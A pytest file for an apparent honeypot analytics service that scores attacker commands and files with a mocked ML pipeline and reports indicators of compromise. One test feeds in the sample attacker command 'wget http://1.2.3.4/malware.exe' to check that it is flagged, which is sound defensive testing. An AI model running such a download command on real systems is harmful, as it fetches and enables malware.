import asyncio
from unittest.mock import ANY, MagicMock, patch

import pytest

from cyanide.services.analytics import AnalyticsService


@pytest.fixture
def base_config():
    return {"ml": {"enabled": True, "online_learning": True, "retraining_interval_days": 0.00001}}


@pytest.mark.asyncio
async def test_analytics_online_learning_loop_success(base_config):
    mock_logger = MagicMock()
    service = AnalyticsService(base_config, mock_logger)
    service.ml_pipeline = MagicMock()
    service._fetch_training_data = MagicMock(return_value=["ls", "whoami"])

    # We patch sleep to return once and then raise CancelledError to break the loop
    with patch("asyncio.sleep", side_effect=[None, asyncio.CancelledError()]):
        with pytest.raises(asyncio.CancelledError):
            await service.run_online_learning_loop()

    service.ml_pipeline.retrain.assert_called_with(["ls", "whoami"])
    mock_logger.log_event.assert_any_call("system", "ml_retraining_complete", {"count": 2})


@pytest.mark.asyncio
async def test_analytics_online_learning_loop_error(base_config):
    mock_logger = MagicMock()
    service = AnalyticsService(base_config, mock_logger)
    # retrain will be called via run_in_executor
    service.ml_pipeline = MagicMock()
    service.ml_pipeline.retrain.side_effect = Exception("retrain fail")
    service._fetch_training_data = MagicMock(return_value=["ls"])

    with patch("asyncio.sleep", side_effect=[None, asyncio.CancelledError()]):
        with pytest.raises(asyncio.CancelledError):
            await service.run_online_learning_loop()

    mock_logger.log_event.assert_any_call(
        "system", "ml_retraining_error", {"error": "retrain fail"}
    )


def test_fetch_training_data_empty():
    service = AnalyticsService({"ml": {"enabled": False}}, MagicMock())
    with patch("pathlib.Path.exists", return_value=False):
        data = service._fetch_training_data()
        assert data == []


@pytest.mark.asyncio
async def test_analyze_command_exception():
    service = AnalyticsService({"ml": {"enabled": True}}, MagicMock())
    service.ml_pipeline = MagicMock()
    service.ml_pipeline.analyze_command.side_effect = Exception("pipeline error")

    # This should not crash but log the error (analyze_command is sync)
    # Signature: analyze_command(self, cmd: str, src_ip: str, session_id: str, ...)
    service.analyze_command("ls", "1.2.3.4", "test_sess")
    service.logger.log_event.assert_any_call(
        "test_sess", "error", {"message": "ML Error: pipeline error"}
    )


@pytest.mark.asyncio
async def test_analyze_command_success():
    service = AnalyticsService({"ml": {"enabled": True}}, MagicMock())
    service.ml_pipeline = MagicMock()
    service.ml_pipeline.analyze_command.return_value = {
        "is_anomaly": True,
        "anomaly_score": 0.95,
        "reconstruction_error": 0.1,
        "classification": "backdoor",
        "severity": "high",
    }

    # Signature: analyze_command(self, cmd: str, src_ip: str, session_id: str, ...)
    service.ioc_reporter = MagicMock()
    service.analyze_command("wget http://1.2.3.4/malware.exe", "1.2.3.4", "test_sess")

    # Check ml_thought and ml_anomaly logs
    assert any("ml_thought" in str(call) for call in service.logger.log_event.call_args_list)
    assert any("ml_anomaly" in str(call) for call in service.logger.log_event.call_args_list)

    # Check IOC reporter calls
    service.ioc_reporter.add_ioc.assert_any_call(
        "url", "http://1.2.3.4/malware.exe", ANY, "test_sess", severity="high"
    )
    service.ioc_reporter.add_ioc.assert_any_call(
        "ipv4-addr", "1.2.3.4", ANY, "test_sess", severity="high"
    )


@pytest.mark.asyncio
async def test_analyze_file_success():
    service = AnalyticsService({"ml": {"enabled": True}}, MagicMock())
    service.ml_pipeline = MagicMock()
    service.ml_pipeline.analyze_command.return_value = {
        "is_anomaly": True,
        "anomaly_score": 0.8,
        "reconstruction_error": 0.05,
        "classification": "malware",
        "severity": "critical",
    }

    with patch("hashlib.sha256") as mock_sha:
        mock_sha.return_value.hexdigest.return_value = "fake_hash"
        # Signature: analyze_file(self, filename: str, content: bytes, session_id: str, src_ip: str)
        service.analyze_file("/tmp/malware", b"malicious data", "test_sess", "1.2.3.4")

    # In analytics.py, it logs "ml_thought" and "ml_file_anomaly"
    assert any("ml_thought" in str(call) for call in service.logger.log_event.call_args_list)
    assert any("ml_file_anomaly" in str(call) for call in service.logger.log_event.call_args_list)
